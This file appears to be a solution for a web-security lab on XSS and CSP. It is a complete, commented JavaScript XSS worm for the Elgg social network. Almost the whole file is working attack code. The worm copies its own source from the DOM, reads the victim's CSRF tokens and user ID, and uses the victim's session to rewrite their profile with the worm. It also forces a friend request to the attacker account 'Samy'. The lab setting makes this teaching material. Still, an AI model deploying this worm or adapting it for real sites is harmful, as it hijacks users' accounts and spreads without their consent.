/*
 * Lab 3 — XSS and CSP
 * Task 4: Self-Propagating XSS Worm
 * Description:
 *   A self-replicating XSS worm stored in Samy's Elgg profile.
 *   When a victim visits Samy's profile:
 *     1. The script reads its OWN source code from the DOM.
 *     2. It reads CSRF tokens and the victim's GUID.
 *     3. It updates the VICTIM's profile description to contain the worm
 *        code — so anyone who visits the VICTIM's profile is also infected.
 *     4. It adds Samy as a friend of the victim.
 *
 * Self-replication mechanism:
 *   The <script> tag that embeds this payload is given the attribute id="worm".
 *   Inside the script, document.getElementById('worm').innerHTML retrieves
 *   the exact JavaScript source text.  This is then wrapped back inside a
 *   <script id="worm"> tag and embedded in the profile description POST body,
 *   ensuring every infected profile carries a functionally identical copy.
 *
 * The script tag to place in Samy's profile:
 *   <script id="worm">... (this code) ...</script>
 */

(function () {
    "use strict";

    // ------------------------------------------------------------------
    // Step 1: Read this script's own source code from the DOM
    // ------------------------------------------------------------------
    // document.getElementById('worm') selects the <script id="worm"> element
    // that contains this code.  .innerHTML gives the raw JavaScript text.
    // We then re-wrap it in a <script id="worm"> block so the copy is
    // syntactically identical to the original and will self-replicate again.

    var wormCode = "<script id=\"worm\">"
                 + document.getElementById("worm").innerHTML
                 + "<\/script>";
    // Note: "<\/script>" avoids prematurely closing the outer script tag
    // (the backslash is an escape character in JavaScript strings but is
    //  transparent to HTML parsers, so the output is: </script>).

    // ------------------------------------------------------------------
    // Step 2: Read CSRF tokens and victim GUID
    // ------------------------------------------------------------------

    var ts    = elgg.security.token.__elgg_ts;
    var token = elgg.security.token.__elgg_token;
    var guid  = elgg.session.user.guid;     // Victim's GUID (dynamic)

    // Do not infect the attacker's own profile (would overwrite the payload)
    var samyGUID = 59;
    if (guid === samyGUID) {
        return;
    }

    // ------------------------------------------------------------------
    // Step 3: Build the profile-update POST body containing the worm
    // ------------------------------------------------------------------
    // The description field is set to wormCode (the self-replicated script).
    // Any visitor of the newly infected profile will trigger the worm again.

    var profileContent =
        "__elgg_token="    + encodeURIComponent(token)               + "&" +
        "__elgg_ts="       + encodeURIComponent(ts)                  + "&" +
        "name="            + encodeURIComponent("Samy")              + "&" +
        // Embed worm code AND the human-readable message in the description
        "description="     + encodeURIComponent(wormCode + "<br/>Samy is my hero") + "&" +
        "accesslevel%5Bdescription%5D=2"                             + "&" +
        "briefdescription=" + encodeURIComponent("")                 + "&" +
        "location="        + encodeURIComponent("")                  + "&" +
        "interests="       + encodeURIComponent("")                  + "&" +
        "skills="          + encodeURIComponent("")                  + "&" +
        "contactemail="    + encodeURIComponent("")                  + "&" +
        "phone="           + encodeURIComponent("")                  + "&" +
        "mobile="          + encodeURIComponent("")                  + "&" +
        "website="         + encodeURIComponent("")                  + "&" +
        "twitter="         + encodeURIComponent("")                  + "&" +
        "guid="            + guid;

    // ------------------------------------------------------------------
    // Step 4: POST the infected profile update
    // ------------------------------------------------------------------

    var profileURL = "http://www.seed-server.com/action/profile/edit";
    var req1 = new XMLHttpRequest();
    req1.open("POST", profileURL, true);
    req1.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    req1.withCredentials = true;
    req1.send(profileContent);

    // ------------------------------------------------------------------
    // Step 5: Also add Samy as a friend (same as Task 2)
    // ------------------------------------------------------------------
    // Run this in a short timeout to avoid race conditions with the
    // profile update request above.

    setTimeout(function () {
        var friendURL = "http://www.seed-server.com/action/friends/add"
                      + "?friend=" + samyGUID
                      + "&__elgg_ts=" + ts
                      + "&__elgg_token=" + token;

        var req2 = new XMLHttpRequest();
        req2.open("GET", friendURL, true);
        req2.withCredentials = true;
        req2.send();
    }, 200);   // 200 ms delay

    // console.log("[XSS Worm] Victim " + guid + " infected and friend-added.");

})();
